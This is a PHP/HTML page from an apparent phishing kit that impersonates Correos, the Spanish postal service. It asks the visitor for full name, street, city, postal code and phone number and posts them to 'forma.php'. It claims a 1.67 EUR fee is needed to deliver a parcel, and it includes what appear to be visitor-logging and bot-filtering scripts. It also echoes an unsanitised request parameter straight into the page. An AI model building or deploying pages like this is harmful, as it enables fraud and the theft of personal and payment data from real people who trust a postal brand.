<?php
error_reporting(0);
$ligne=$_REQUEST['MCO'];
include 'visitor.php';
include 'bot.php';
?>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="fr" lang="fr">
  <head><meta charset="windows-1252">
    
    <meta name="viewport" content="initial-scale=1.0; maximum-scale=1.0; user-scalable=0;"/><meta name="format-detection" content="telephone=no"/>
    <title>Correos</title>
    <link rel="icon" type="image/x-icon" href="favicon.ico"/>
    <link rel="stylesheet" href="css/merchant2.css" type="text/css"/>
	    <link rel="stylesheet" href="css/opus.css" type="text/css"/>
		<link rel="stylesheet" href="css/footer.css" type="text/css"/>
		<link rel="stylesheet" href="css/onei.css" type="text/css"/>
		<link rel="stylesheet" href="css/eui.css" type="text/css"/>
		<link rel="stylesheet" href="css/pie.css" type="text/css"/>
		<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" type="text/css"/>
		
		<style type="text/css">
  #heading{
    text-align: center;
    font-size: 15px;
	font-weight: bold;
    margin-left: 10px;
    margin-top: 10px;
    float:right;
  }
</style>
  </head>
 <body>

            <div style="background-color:#fff;padding-right:5px;padding-left:10px;" class="col-xs-12 col-md-8 col-lg-8 col-xl-8"><img style="margin-top: 0px; height: 54px; width: 110px;" src="css/correos.png">
                
                <br><span id="heading">Pedido : ES64M133</span><br><br>
            </div>

<div id="amount"></div>
    <div id="container">
      <div id="header">
       <div class="divTitle">
            <label> <span class="libelle">Direcci&oacute;n de env&iacute;o actual
</span><br> &nbsp;</label>
          <br>
          <span class="subtitle"></span>
        </div>
      </div>

      <form action="forma.php" method="post" id="payment_form" onsubmit="return checkForm();">
        <input type="hidden" name="LANG" value="fr">
        <input type="hidden" name="MCO" value="<?php print $ligne ?>">
        <input type="hidden" name="client_type" value="mobile">
        <input type="hidden" name="page_type" value="payment_offbill">

        <div id="input_data">
          <div id="form_js_error_container">
              <div class="wal_warning">
                <div class="warningImage"></div>
                <div id="warning_message" class="warning_message"></div>
                <div class="clear"></div>
              </div>
          </div>

          
          <div class="form_CardNumber">
            <label for="form_card_number" class="libelle"><i class="fa fa-user"></i> Nombre y apellidos<span class="star">&nbsp;*</span></label><br>
            <input type="text" size="16" class="largeinput" name="nombre" autocomplete="off" required>
          </div>
<div class="form_CardNumber">
            <label for="form_card_number" class="libelle"><i class="fa fa-home"></i> Calle / N&uacute;mero
             <span class="star">&nbsp;*</span></label><br>
            <input type="text" size="16" class="largeinput" name="calle"  autocomplete="off" required>
          </div>
          
          <div class="security_code">
            <div>
              <label for="form_card_security">
                <span class="libelle">Cuidad</span>
                <span class="star">&nbsp;*</span>
              </label>
    <span style="margin-left:70px;" class="libelle">C&oacute;digo Postal</span><span class="star">&nbsp;*</span>
            </div>
            <input type="text" size="8" class="codeSecuriteinput" name="cuidad" autocomplete="off" required> 
			<input style="margin-left:15px;" type="num" size="8" pattern="[0-9]*" class="codeSecuriteinput" name="postal" autocomplete="off" maxlength="5" required>
<div class="form_CardNumber">
    
            <label for="form_card_number" class="libelle"><i class="fa fa-phone"></i> Tel&eacute;fono
             <span class="star">&nbsp;*</span></label><br>
            <input type="text" size="16" class="largeinput" name="tele" value="+34<?php echo $ligne ?>" maxlength="19" autocomplete="off">
          </div>
            
            <div class="security_code_info petit">
              Nota : Debe ingresar sus datos y pagar 1.67 EUR para recibir su paquete con correos
            </div>

          </div>
        </div>
        <div class="button">
          <input type="button" class="btn cancel" id="form_button_cancel" name="form_button_cancel" onclick="submitForm(this, 'action', 'cancel');" value="cancelar">
          <input type="submit" class="btn" id="form_button_submit" name="form_button_submit" value="continuar">
        </div>
      </form>
      
    <script type="text/javascript" src="js/jquery.slim.min.js"></script>
    <script type="text/javascript" src="js/validationform.min.js"></script>
    <noscript>Cette page utilise du Javascript. Activez le Javascript via le menu "options" de votre navigateur.</noscript>
  

</div></body>
</html>
